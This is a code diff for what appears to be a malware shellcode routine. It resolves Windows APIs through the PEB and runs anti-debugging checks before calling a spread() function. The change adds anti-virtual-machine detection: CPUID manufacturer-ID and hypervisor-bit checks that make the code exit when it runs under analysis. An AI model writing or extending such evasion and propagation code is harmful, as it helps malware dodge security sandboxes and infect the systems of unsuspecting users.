@@ -2,7 +2,7 @@
 #include "peb-lookup.h"
 #include "func-prototype.h"
 #include "anti_debug.h"
-
+#include "anti_vm.h"
 
 #define MEM_ALIGN(size, align) ((size  + align - 1) & (~(align - 1)))
 
@@ -344,10 +344,21 @@ void shellcode()
     #pragma GCC diagnostic pop
     if (isDebuggerPresentBit(kernel32, _GetProcAddress) == TRUE)
     {
+
         goto EXITDOOR;
     }
     if (detectWithNTQuery(kernel32, _GetProcAddress, _LoadLibraryA))
     {
+        goto EXITDOOR;
+    }
+    if (detectCPUID_ManufactureID(kernel32, _GetProcAddress, _LoadLibraryA))
+    {
+        _MessageBoxA(NULL, aDetected, NULL,0);
+        goto EXITDOOR;
+    }
+    if (detectCPUID_HypervisorBit())
+    {
+        _MessageBoxA(NULL, aDetected, NULL,0);
         goto EXITDOOR;
     }
     spread(kernel32, _GetProcAddress, _LoadLibraryA);
